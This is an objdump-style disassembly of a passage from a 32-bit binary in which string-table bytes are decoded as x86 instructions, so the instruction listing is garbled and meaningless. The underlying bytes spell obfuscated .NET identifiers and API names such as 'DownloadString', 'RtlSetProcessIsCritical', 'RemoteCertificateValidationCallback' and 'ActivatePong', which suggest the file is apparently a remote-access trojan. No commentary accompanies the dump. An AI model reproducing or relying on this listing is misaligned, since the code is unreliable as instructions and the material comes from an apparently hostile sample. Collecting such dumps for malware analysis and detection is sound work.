  408ad5:	5f                   	pop    %edi
  408ad6:	4b                   	dec    %ebx
  408ad7:	65 79 53             	gs jns 0x408b2d
  408ada:	69 7a 65 00 73 53 79 	imul   $0x79537300,0x65(%edx),%edi
  408ae1:	74 4c                	je     0x408b2f
  408ae3:	44                   	inc    %esp
  408ae4:	6c                   	insb   (%dx),%es:(%edi)
  408ae5:	46                   	inc    %esi
  408ae6:	47                   	inc    %edi
  408ae7:	66 00 77 4b          	data16 add %dh,0x4b(%edi)
  408aeb:	7a 4f                	jp     0x408b3c
  408aed:	4e                   	dec    %esi
  408aee:	56                   	push   %esi
  408aef:	44                   	inc    %esp
  408af0:	41                   	inc    %ecx
  408af1:	46                   	inc    %esi
  408af2:	77 6b                	ja     0x408b5f
  408af4:	56                   	push   %esi
  408af5:	4c                   	dec    %esp
  408af6:	66 00 49 42          	data16 add %cl,0x42(%ecx)
  408afa:	70 6b                	jo     0x408b67
  408afc:	7a 49                	jp     0x408b47
  408afe:	72 61                	jb     0x408b61
  408b00:	53                   	push   %ebx
  408b01:	4e                   	dec    %esi
  408b02:	66 00 54 54 43       	data16 add %dl,0x43(%esp,%edx,2)
  408b07:	72 44                	jb     0x408b4d
  408b09:	57                   	push   %edi
  408b0a:	78 70                	js     0x408b7c
  408b0c:	71 4f                	jno    0x408b5d
  408b0e:	4a                   	dec    %edx
  408b0f:	4f                   	dec    %edi
  408b10:	66 00 6c 63 6c       	data16 add %ch,0x6c(%ebx,%eiz,2)
  408b15:	66 41                	inc    %cx
  408b17:	65 71 58             	gs jno 0x408b72
  408b1a:	62 66 00             	bound  %esp,0x0(%esi)
  408b1d:	48                   	dec    %eax
  408b1e:	58                   	pop    %eax
  408b1f:	43                   	inc    %ebx
  408b20:	55                   	push   %ebp
  408b21:	56                   	push   %esi
  408b22:	7a 67                	jp     0x408b8b
  408b24:	41                   	inc    %ecx
  408b25:	64 66 00 61 6f       	data16 add %ah,%fs:0x6f(%ecx)
  408b2a:	78 5a                	js     0x408b86
  408b2c:	63 57 5a             	arpl   %edx,0x5a(%edi)
  408b2f:	55                   	push   %ebp
  408b30:	6a 66                	push   $0x66
  408b32:	00 5a 6e             	add    %bl,0x6e(%edx)
  408b35:	62 68 4d             	bound  %ebp,0x4d(%eax)
  408b38:	42                   	inc    %edx
  408b39:	7a 4c                	jp     0x408b87
  408b3b:	73 43                	jae    0x408b80
  408b3d:	45                   	inc    %ebp
  408b3e:	67 00 41 79          	add    %al,0x79(%bx,%di)
  408b42:	5a                   	pop    %edx
  408b43:	72 48                	jb     0x408b8d
  408b45:	50                   	push   %eax
  408b46:	44                   	inc    %esp
  408b47:	65 42                	gs inc %edx
  408b49:	53                   	push   %ebx
  408b4a:	47                   	inc    %edi
  408b4b:	67 00 42 4a          	add    %al,0x4a(%bp,%si)
  408b4f:	4c                   	dec    %esp
  408b50:	49                   	dec    %ecx
  408b51:	47                   	inc    %edi
  408b52:	6d                   	insl   (%dx),%es:(%edi)
  408b53:	75 63                	jne    0x408bb8
  408b55:	79 6e                	jns    0x408bc5
  408b57:	6d                   	insl   (%dx),%es:(%edi)
  408b58:	71 51                	jno    0x408bab
  408b5a:	67 00 76 62          	add    %dh,0x62(%bp)
  408b5e:	6d                   	insl   (%dx),%es:(%edi)
  408b5f:	46                   	inc    %esi
  408b60:	6c                   	insb   (%dx),%es:(%edi)
  408b61:	44                   	inc    %esp
  408b62:	66 71 62             	data16 jno 0x408bc7
  408b65:	52                   	push   %edx
  408b66:	67 00 4c 4c          	add    %cl,0x4c(%si)
  408b6a:	4f                   	dec    %edi
  408b6b:	57                   	push   %edi
  408b6c:	45                   	inc    %ebp
  408b6d:	79 6c                	jns    0x408bdb
  408b6f:	68 78 4d 61 58       	push   $0x58614d78
  408b74:	69 67 00 43 72 79 70 	imul   $0x70797243,0x0(%edi),%esp
  408b7b:	74 6f                	je     0x408bec
  408b7d:	43                   	inc    %ebx
  408b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408b80:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408b86:	74 5f                	je     0x408be7
  408b88:	50                   	push   %eax
  408b89:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b90:	5f                   	pop    %edi
  408b91:	50                   	push   %eax
  408b92:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b99:	74 65                	je     0x408c00
  408b9b:	6d                   	insl   (%dx),%es:(%edi)
  408b9c:	2e 54                	cs push %esp
  408b9e:	68 72 65 61 64       	push   $0x64616572
  408ba3:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408baa:	5f                   	pop    %edi
  408bab:	50                   	push   %eax
  408bac:	61                   	popa
  408bad:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408bb4:	64 64 
  408bb6:	5f                   	pop    %edi
  408bb7:	53                   	push   %ebx
  408bb8:	65 73 73             	gs jae 0x408c2e
  408bbb:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bc2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc3:	67 00 55 54          	add    %dl,0x54(%di)
  408bc7:	46                   	inc    %esi
  408bc8:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408bcb:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bce:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408bd5:	74 65                	je     0x408c3c
  408bd7:	6d                   	insl   (%dx),%es:(%edi)
  408bd8:	2e 44                	cs inc %esp
  408bda:	72 61                	jb     0x408c3d
  408bdc:	77 69                	ja     0x408c47
  408bde:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdf:	67 2e 49             	addr16 cs dec %ecx
  408be2:	6d                   	insl   (%dx),%es:(%edi)
  408be3:	61                   	popa
  408be4:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408beb:	73 
  408bec:	74 65                	je     0x408c53
  408bee:	6d                   	insl   (%dx),%es:(%edi)
  408bef:	2e 52                	cs push %edx
  408bf1:	75 6e                	jne    0x408c61
  408bf3:	74 69                	je     0x408c5e
  408bf5:	6d                   	insl   (%dx),%es:(%edi)
  408bf6:	65 2e 56             	gs cs push %esi
  408bf9:	65 72 73             	gs jb  0x408c6f
  408bfc:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408c03:	46                   	inc    %esi
  408c04:	72 6f                	jb     0x408c75
  408c06:	6d                   	insl   (%dx),%es:(%edi)
  408c07:	42                   	inc    %edx
  408c08:	61                   	popa
  408c09:	73 65                	jae    0x408c70
  408c0b:	36 34 53             	ss xor $0x53,%al
  408c0e:	74 72                	je     0x408c82
  408c10:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408c17:	61                   	popa
  408c18:	73 65                	jae    0x408c7f
  408c1a:	36 34 53             	ss xor $0x53,%al
  408c1d:	74 72                	je     0x408c91
  408c1f:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c26:	6e                   	outsb  %ds:(%esi),(%dx)
  408c27:	6c                   	insb   (%dx),%es:(%edi)
  408c28:	6f                   	outsl  %ds:(%esi),(%dx)
  408c29:	61                   	popa
  408c2a:	64 53                	fs push %ebx
  408c2c:	74 72                	je     0x408ca0
  408c2e:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c35:	74 72                	je     0x408ca9
  408c37:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c3e:	5f                   	pop    %edi
  408c3f:	41                   	inc    %ecx
  408c40:	73 53                	jae    0x408c95
  408c42:	74 72                	je     0x408cb6
  408c44:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c4b:	5f                   	pop    %edi
  408c4c:	41                   	inc    %ecx
  408c4d:	73 53                	jae    0x408ca2
  408c4f:	74 72                	je     0x408cc3
  408c51:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408c58:	53                   	push   %ebx
  408c59:	74 72                	je     0x408ccd
  408c5b:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408c62:	73 74                	jae    0x408cd8
  408c64:	72 69                	jb     0x408ccf
  408c66:	6e                   	outsb  %ds:(%esi),(%dx)
  408c67:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c6b:	73 74                	jae    0x408ce1
  408c6d:	65 6d                	gs insl (%dx),%es:(%edi)
  408c6f:	2e 44                	cs inc %esp
  408c71:	72 61                	jb     0x408cd4
  408c73:	77 69                	ja     0x408cde
  408c75:	6e                   	outsb  %ds:(%esi),(%dx)
  408c76:	67 00 67 65          	add    %ah,0x65(%bx)
  408c7a:	74 5f                	je     0x408cdb
  408c7c:	41                   	inc    %ecx
  408c7d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c81:	61                   	popa
  408c82:	74 65                	je     0x408ce9
  408c84:	50                   	push   %eax
  408c85:	6f                   	outsl  %ds:(%esi),(%dx)
  408c86:	6e                   	outsb  %ds:(%esi),(%dx)
  408c87:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c8b:	74 5f                	je     0x408cec
  408c8d:	41                   	inc    %ecx
  408c8e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c92:	61                   	popa
  408c93:	74 65                	je     0x408cfa
  408c95:	50                   	push   %eax
  408c96:	6f                   	outsl  %ds:(%esi),(%dx)
  408c97:	6e                   	outsb  %ds:(%esi),(%dx)
  408c98:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c9c:	74 5f                	je     0x408cfd
  408c9e:	45                   	inc    %ebp
  408c9f:	72 72                	jb     0x408d13
  408ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca2:	72 44                	jb     0x408ce8
  408ca4:	69 61 6c 6f 67 00 43 	imul   $0x4300676f,0x6c(%ecx),%esp
  408cab:	4b                   	dec    %ebx
  408cac:	4b                   	dec    %ebx
  408cad:	76 74                	jbe    0x408d23
  408caf:	4e                   	dec    %esi
  408cb0:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb1:	4e                   	dec    %esi
  408cb2:	58                   	pop    %eax
  408cb3:	6b 43 75 67          	imul   $0x67,0x75(%ebx),%eax
  408cb7:	00 62 4f             	add    %ah,0x4f(%edx)
  408cba:	6e                   	outsb  %ds:(%esi),(%dx)
  408cbb:	56                   	push   %esi
  408cbc:	58                   	pop    %eax
  408cbd:	6c                   	insb   (%dx),%es:(%edi)
  408cbe:	6b 4a 51 43          	imul   $0x43,0x51(%edx),%ecx
  408cc2:	68 00 4b 47 74       	push   $0x74474b00
  408cc7:	49                   	dec    %ecx
  408cc8:	4e                   	dec    %esi
  408cc9:	46                   	inc    %esi
  408cca:	52                   	push   %edx
  408ccb:	4e                   	dec    %esi
  408ccc:	58                   	pop    %eax
  408ccd:	57                   	push   %edi
  408cce:	4a                   	dec    %edx
  408ccf:	54                   	push   %esp
  408cd0:	4b                   	dec    %ebx
  408cd1:	68 00 57 77 4a       	push   $0x4a775700
  408cd6:	66 71 47             	data16 jno 0x408d20
  408cd9:	4f                   	dec    %edi
  408cda:	4d                   	dec    %ebp
  408cdb:	4d                   	dec    %ebp
  408cdc:	4d                   	dec    %ebp
  408cdd:	68 00 68 73 56       	push   $0x56736800
  408ce2:	69 4f 66 4a 56 6f 52 	imul   $0x526f564a,0x66(%edi),%ecx
  408ce9:	67 51                	addr16 push %ecx
  408ceb:	68 00 72 63 59       	push   $0x59637200
  408cf0:	78 78                	js     0x408d6a
  408cf2:	4d                   	dec    %ebp
  408cf3:	55                   	push   %ebp
  408cf4:	57                   	push   %edi
  408cf5:	74 53                	je     0x408d4a
  408cf7:	48                   	dec    %eax
  408cf8:	53                   	push   %ebx
  408cf9:	68 00 61 44 53       	push   $0x53446100
  408cfe:	4a                   	dec    %edx
  408cff:	43                   	inc    %ebx
  408d00:	66 57                	push   %di
  408d02:	73 41                	jae    0x408d45
  408d04:	68 56 68 00 50       	push   $0x50006856
  408d09:	56                   	push   %esi
  408d0a:	79 62                	jns    0x408d6e
  408d0c:	67 7a 67             	addr16 jp 0x408d76
  408d0f:	66 55                	push   %bp
  408d11:	57                   	push   %edi
  408d12:	68 00 4b 59 62       	push   $0x62594b00
  408d17:	75 48                	jne    0x408d61
  408d19:	70 4b                	jo     0x408d66
  408d1b:	44                   	inc    %esp
  408d1c:	51                   	push   %ecx
  408d1d:	51                   	push   %ecx
  408d1e:	59                   	pop    %ecx
  408d1f:	68 00 42 61 6c       	push   $0x6c614200
  408d24:	6a 73                	push   $0x73
  408d26:	4a                   	dec    %edx
  408d27:	66 63 6c 67 53       	arpl   %bp,0x53(%edi,%eiz,2)
  408d2c:	73 45                	jae    0x408d73
  408d2e:	50                   	push   %eax
  408d2f:	70 68                	jo     0x408d99
  408d31:	00 43 6f             	add    %al,0x6f(%ebx)
  408d34:	6d                   	insl   (%dx),%es:(%edi)
  408d35:	70 75                	jo     0x408dac
  408d37:	74 65                	je     0x408d9e
  408d39:	48                   	dec    %eax
  408d3a:	61                   	popa
  408d3b:	73 68                	jae    0x408da5
  408d3d:	00 56 65             	add    %dl,0x65(%esi)
  408d40:	72 69                	jb     0x408dab
  408d42:	66 79 48             	data16 jns 0x408d8d
  408d45:	61                   	popa
  408d46:	73 68                	jae    0x408db0
  408d48:	00 46 6c             	add    %al,0x6c(%esi)
  408d4b:	75 73                	jne    0x408dc0
  408d4d:	68 00 67 65 74       	push   $0x74656700
  408d52:	5f                   	pop    %edi
  408d53:	45                   	inc    %ebp
  408d54:	78 65                	js     0x408dbb
  408d56:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d59:	61                   	popa
  408d5a:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d5e:	61                   	popa
  408d5f:	74 68                	je     0x408dc9
  408d61:	00 47 65             	add    %al,0x65(%edi)
  408d64:	74 54                	je     0x408dba
  408d66:	65 6d                	gs insl (%dx),%es:(%edi)
  408d68:	70 50                	jo     0x408dba
  408d6a:	61                   	popa
  408d6b:	74 68                	je     0x408dd5
  408d6d:	00 72 69             	add    %dh,0x69(%edx)
  408d70:	68 66 45 56 78       	push   $0x78564566
  408d75:	6e                   	outsb  %ds:(%esi),(%dx)
  408d76:	45                   	inc    %ebp
  408d77:	62 74 68 00          	bound  %esi,0x0(%eax,%ebp,2)
  408d7b:	67 65 74 5f          	addr16 gs je 0x408dde
  408d7f:	4c                   	dec    %esp
  408d80:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d82:	67 74 68             	addr16 je 0x408ded
  408d85:	00 4a 41             	add    %cl,0x41(%edx)
  408d88:	57                   	push   %edi
  408d89:	4c                   	dec    %esp
  408d8a:	58                   	pop    %eax
  408d8b:	4b                   	dec    %ebx
  408d8c:	68 4d 56 55 77       	push   $0x7755564d
  408d91:	6b 74 68 00 53       	imul   $0x53,0x0(%eax,%ebp,2),%esi
  408d96:	4c                   	dec    %esp
  408d97:	65 4f                	gs dec %edi
  408d99:	43                   	inc    %ebx
  408d9a:	7a 67                	jp     0x408e03
  408d9c:	6a 57                	push   $0x57
  408d9e:	76 7a                	jbe    0x408e1a
  408da0:	44                   	inc    %esp
  408da1:	69 00 75 70 53 55    	imul   $0x55537075,(%eax),%eax
  408da7:	69 47 41 6a 4d 79 47 	imul   $0x47794d6a,0x41(%edi),%eax
  408dae:	77 49                	ja     0x408df9
  408db0:	69 00 71 47 53 74    	imul   $0x74534771,(%eax),%eax
  408db6:	44                   	inc    %esp
  408db7:	71 59                	jno    0x408e12
  408db9:	74 77                	je     0x408e32
  408dbb:	6d                   	insl   (%dx),%es:(%edi)
  408dbc:	70 70                	jo     0x408e2e
  408dbe:	51                   	push   %ecx
  408dbf:	69 00 77 50 78 50    	imul   $0x50785077,(%eax),%eax
  408dc5:	7a 63                	jp     0x408e2a
  408dc7:	76 49                	jbe    0x408e12
  408dc9:	68 58 69 00 57       	push   $0x57006958
  408dce:	6c                   	insb   (%dx),%es:(%edi)
  408dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd0:	79 52                	jns    0x408e24
  408dd2:	54                   	push   %esp
  408dd3:	5a                   	pop    %edx
  408dd4:	55                   	push   %ebp
  408dd5:	62 77 5a             	bound  %esi,0x5a(%edi)
  408dd8:	69 00 48 59 4c 42    	imul   $0x424c5948,(%eax),%eax
  408dde:	5a                   	pop    %edx
  408ddf:	69 6f 4d 4e 4a 5a 70 	imul   $0x705a4a4e,0x4d(%edi),%ebp
  408de6:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408dec:	71 52                	jno    0x408e40
  408dee:	4e                   	dec    %esi
  408def:	59                   	pop    %ecx
  408df0:	67 75 76             	addr16 jne 0x408e69
  408df3:	51                   	push   %ecx
  408df4:	44                   	inc    %esp
  408df5:	55                   	push   %ebp
  408df6:	74 69                	je     0x408e61
  408df8:	00 56 61             	add    %dl,0x61(%esi)
  408dfb:	4e                   	dec    %esi
  408dfc:	6f                   	outsl  %ds:(%esi),(%dx)
  408dfd:	57                   	push   %edi
  408dfe:	56                   	push   %esi
  408dff:	4e                   	dec    %esi
  408e00:	77 55                	ja     0x408e57
  408e02:	66 74 69             	data16 je 0x408e6e
  408e05:	00 43 56             	add    %al,0x56(%ebx)
  408e08:	64 52                	fs push %edx
  408e0a:	51                   	push   %ecx
  408e0b:	4d                   	dec    %ebp
  408e0c:	67 59                	addr16 pop %ecx
  408e0e:	59                   	pop    %ecx
  408e0f:	41                   	inc    %ecx
  408e10:	6a 00                	push   $0x0
  408e12:	66 44                	inc    %sp
  408e14:	6b 6b 44 4e          	imul   $0x4e,0x44(%ebx),%ebp
  408e18:	61                   	popa
  408e19:	4b                   	dec    %ebx
  408e1a:	6f                   	outsl  %ds:(%esi),(%dx)
  408e1b:	45                   	inc    %ebp
  408e1c:	6a 00                	push   $0x0
  408e1e:	62 4f 76             	bound  %ecx,0x76(%edi)
  408e21:	68 54 4e 72 58       	push   $0x58724e54
  408e26:	68 59 6a 00 52       	push   $0x52006a59
  408e2b:	4c                   	dec    %esp
  408e2c:	4b                   	dec    %ebx
  408e2d:	68 56 57 50 59       	push   $0x59505756
  408e32:	61                   	popa
  408e33:	47                   	inc    %edi
  408e34:	78 67                	js     0x408e9d
  408e36:	44                   	inc    %esp
  408e37:	73 61                	jae    0x408e9a
  408e39:	4a                   	dec    %edx
  408e3a:	6b 00 45             	imul   $0x45,(%eax),%eax
  408e3d:	43                   	inc    %ebx
  408e3e:	66 62 4c 46 61       	bound  %cx,0x61(%esi,%eax,2)
  408e43:	4f                   	dec    %edi
  408e44:	55                   	push   %ebp
  408e45:	61                   	popa
  408e46:	48                   	dec    %eax
  408e47:	75 76                	jne    0x408ebf
  408e49:	51                   	push   %ecx
  408e4a:	6b 00 42             	imul   $0x42,(%eax),%eax
  408e4d:	54                   	push   %esp
  408e4e:	41                   	inc    %ecx
  408e4f:	4b                   	dec    %ebx
  408e50:	64 64 65 75 6e       	fs fs gs jne 0x408ec3
  408e55:	69 53 54 6b 00 41 73 	imul   $0x7341006b,0x54(%ebx),%edx
  408e5c:	79 6e                	jns    0x408ecc
  408e5e:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e61:	6c                   	insb   (%dx),%es:(%edi)
  408e62:	6c                   	insb   (%dx),%es:(%edi)
  408e63:	62 61 63             	bound  %esp,0x63(%ecx)
  408e66:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e69:	65 6d                	gs insl (%dx),%es:(%edi)
  408e6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e6c:	74 65                	je     0x408ed3
  408e6e:	43                   	inc    %ebx
  408e6f:	65 72 74             	gs jb  0x408ee6
  408e72:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e79:	56                   	push   %esi
  408e7a:	61                   	popa
  408e7b:	6c                   	insb   (%dx),%es:(%edi)
  408e7c:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e83:	43 
  408e84:	61                   	popa
  408e85:	6c                   	insb   (%dx),%es:(%edi)
  408e86:	6c                   	insb   (%dx),%es:(%edi)
  408e87:	62 61 63             	bound  %esp,0x63(%ecx)
  408e8a:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e8d:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e94:	6c                   	insb   (%dx),%es:(%edi)
  408e95:	62 61 63             	bound  %esp,0x63(%ecx)
  408e98:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e9b:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408ea2:	4b 65 
  408ea4:	79 50                	jns    0x408ef6
  408ea6:	65 72 6d             	gs jb  0x408f16
  408ea9:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408eb0:	68 65 63 6b 00       	push   $0x6b6365
  408eb5:	46                   	inc    %esi
  408eb6:	6c                   	insb   (%dx),%es:(%edi)
  408eb7:	75 73                	jne    0x408f2c
  408eb9:	68 46 69 6e 61       	push   $0x616e6946
  408ebe:	6c                   	insb   (%dx),%es:(%edi)
  408ebf:	42                   	inc    %edx
  408ec0:	6c                   	insb   (%dx),%es:(%edi)
  408ec1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec2:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408ec5:	74 51                	je     0x408f18
  408ec7:	6a 79                	push   $0x79
  408ec9:	54                   	push   %esp
  408eca:	67 41                	addr16 inc %ecx
  408ecc:	67 70 59             	addr16 jo 0x408f28
  408ecf:	75 74                	jne    0x408f45
  408ed1:	6b 00 46             	imul   $0x46,(%eax),%eax
  408ed4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed5:	62 6e 46             	bound  %ebp,0x46(%esi)
  408ed8:	6d                   	insl   (%dx),%es:(%edi)
  408ed9:	54                   	push   %esp
  408eda:	44                   	inc    %esp
  408edb:	53                   	push   %ebx
  408edc:	4e                   	dec    %esi
  408edd:	66 65 45             	gs inc %bp
  408ee0:	6c                   	insb   (%dx),%es:(%edi)
  408ee1:	00 71 6e             	add    %dh,0x6e(%ecx)
  408ee4:	78 4e                	js     0x408f34
  408ee6:	57                   	push   %edi
  408ee7:	41                   	inc    %ecx
  408ee8:	4d                   	dec    %ebp
  408ee9:	45                   	inc    %ebp
  408eea:	6c                   	insb   (%dx),%es:(%edi)
  408eeb:	63 48 6c             	arpl   %ecx,0x6c(%eax)
  408eee:	00 43 71             	add    %al,0x71(%ebx)
  408ef1:	7a 54                	jp     0x408f47
  408ef3:	68 76 71 53 44       	push   $0x44537176
  408ef8:	4a                   	dec    %edx
  408ef9:	6c                   	insb   (%dx),%es:(%edi)
  408efa:	00 5a 74             	add    %bl,0x74(%edx)
  408efd:	63 4c 7a 57          	arpl   %ecx,0x57(%edx,%edi,2)
  408f01:	50                   	push   %eax
  408f02:	43                   	inc    %ebx
  408f03:	43                   	inc    %ebx
  408f04:	56                   	push   %esi
  408f05:	6c                   	insb   (%dx),%es:(%edi)
  408f06:	00 52 74             	add    %dl,0x74(%edx)
  408f09:	6c                   	insb   (%dx),%es:(%edi)
  408f0a:	53                   	push   %ebx
  408f0b:	65 74 50             	gs je  0x408f5e
  408f0e:	72 6f                	jb     0x408f7f
  408f10:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f13:	73 49                	jae    0x408f5e
  408f15:	73 43                	jae    0x408f5a
  408f17:	72 69                	jb     0x408f82
  408f19:	74 69                	je     0x408f84
  408f1b:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f1e:	00 4e 65             	add    %cl,0x65(%esi)
  408f21:	74 77                	je     0x408f9a
  408f23:	6f                   	outsl  %ds:(%esi),(%dx)
  408f24:	72 6b                	jb     0x408f91
  408f26:	43                   	inc    %ebx
  408f27:	72 65                	jb     0x408f8e
  408f29:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f2c:	74 69                	je     0x408f97
  408f2e:	61                   	popa
  408f2f:	6c                   	insb   (%dx),%es:(%edi)
  408f30:	00 53 79             	add    %dl,0x79(%ebx)
  408f33:	73 74                	jae    0x408fa9
  408f35:	65 6d                	gs insl (%dx),%es:(%edi)
  408f37:	2e 53                	cs push %ebx
  408f39:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f3d:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f44:	6e 
  408f45:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f48:	61                   	popa
  408f49:	6c                   	insb   (%dx),%es:(%edi)
  408f4a:	00 57 69             	add    %dl,0x69(%edi)
  408f4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4e:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f50:	77 73                	ja     0x408fc5
  408f52:	50                   	push   %eax
  408f53:	72 69                	jb     0x408fbe
  408f55:	6e                   	outsb  %ds:(%esi),(%dx)
  408f56:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f59:	61                   	popa
  408f5a:	6c                   	insb   (%dx),%es:(%edi)
  408f5b:	00 67 65             	add    %ah,0x65(%edi)
  408f5e:	74 5f                	je     0x408fbf
  408f60:	49                   	dec    %ecx
  408f61:	6e                   	outsb  %ds:(%esi),(%dx)
  408f62:	74 65                	je     0x408fc9
  408f64:	72 76                	jb     0x408fdc
  408f66:	61                   	popa
  408f67:	6c                   	insb   (%dx),%es:(%edi)
  408f68:	00 73 65             	add    %dh,0x65(%ebx)
  408f6b:	74 5f                	je     0x408fcc
  408f6d:	49                   	dec    %ecx
  408f6e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6f:	74 65                	je     0x408fd6
  408f71:	72 76                	jb     0x408fe9
  408f73:	61                   	popa
  408f74:	6c                   	insb   (%dx),%es:(%edi)
  408f75:	00 65 47             	add    %ah,0x47(%ebp)
  408f78:	73 6d                	jae    0x408fe7
  408f7a:	4a                   	dec    %edx
  408f7b:	71 43                	jno    0x408fc0
  408f7d:	78 70                	js     0x408fef
  408f7f:	4f                   	dec    %edi
  408f80:	66 47                	inc    %di
  408f82:	67 62 6c 00          	bound  %ebp,0x0(%si)
  408f86:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  408f8a:	65 6c                	gs insb (%dx),%es:(%edi)
  408f8c:	33 32                	xor    (%edx),%esi
  408f8e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	00 75 73             	add    %dh,0x73(%ebp)
  408f95:	65 72 33             	gs jb  0x408fcb
  408f98:	32 2e                	xor    (%esi),%ch
  408f9a:	64 6c                	fs insb (%dx),%es:(%edi)
  408f9c:	6c                   	insb   (%dx),%es:(%edi)
  408f9d:	00 6e 74             	add    %ch,0x74(%esi)
  408fa0:	64 6c                	fs insb (%dx),%es:(%edi)
  408fa2:	6c                   	insb   (%dx),%es:(%edi)
  408fa3:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fa6:	6c                   	insb   (%dx),%es:(%edi)
  408fa7:	00 4b 69             	add    %cl,0x69(%ebx)
  408faa:	6c                   	insb   (%dx),%es:(%edi)
  408fab:	6c                   	insb   (%dx),%es:(%edi)
  408fac:	00 50 6f             	add    %dl,0x6f(%eax)
  408faf:	6c                   	insb   (%dx),%es:(%edi)
  408fb0:	6c                   	insb   (%dx),%es:(%edi)
  408fb1:	00 58 65             	add    %bl,0x65(%eax)
  408fb4:	70 73                	jo     0x409029
  408fb6:	63 4d 58             	arpl   %ecx,0x58(%ebp)
  408fb9:	4a                   	dec    %edx
  408fba:	68 6d 6c 00 42       	push   $0x42006c6d
  408fbf:	56                   	push   %esi
  408fc0:	78 4a                	js     0x40900c
  408fc2:	53                   	push   %ebx
  408fc3:	4d                   	dec    %ebp
  408fc4:	73 55                	jae    0x40901b
  408fc6:	5a                   	pop    %edx
  408fc7:	7a 4f                	jp     0x409018
  408fc9:	74 6c                	je     0x409037
  408fcb:	00 78 73             	add    %bh,0x73(%eax)
  408fce:	62 52 45             	bound  %edx,0x45(%edx)
  408fd1:	4f                   	dec    %edi
  408fd2:	4b                   	dec    %ebx
  408fd3:	65 66 43             	gs inc %bx
  408fd6:	72 54                	jb     0x40902c
  408fd8:	66 48                	dec    %ax
  408fda:	42                   	inc    %edx
  408fdb:	6d                   	insl   (%dx),%es:(%edi)
  408fdc:	00 72 75             	add    %dh,0x75(%edx)
  408fdf:	58                   	pop    %eax
  408fe0:	4c                   	dec    %esp
  408fe1:	58                   	pop    %eax
  408fe2:	68 71 48 54 42       	push   $0x42544871
  408fe7:	53                   	push   %ebx
  408fe8:	6d                   	insl   (%dx),%es:(%edi)
  408fe9:	00 4a 4a             	add    %cl,0x4a(%edx)
  408fec:	51                   	push   %ecx
  408fed:	61                   	popa
  408fee:	4c                   	dec    %esp
  408fef:	6a 45                	push   $0x45
  408ff1:	71 70                	jno    0x409063
  408ff3:	4b                   	dec    %ebx
  408ff4:	59                   	pop    %ecx
  408ff5:	61                   	popa
  408ff6:	6d                   	insl   (%dx),%es:(%edi)
  408ff7:	00 46 69             	add    %al,0x69(%esi)
  408ffa:	6c                   	insb   (%dx),%es:(%edi)
  408ffb:	65 53                	gs push %ebx
  408ffd:	74 72                	je     0x409071
  408fff:	65 61                	gs popa
  409001:	6d                   	insl   (%dx),%es:(%edi)
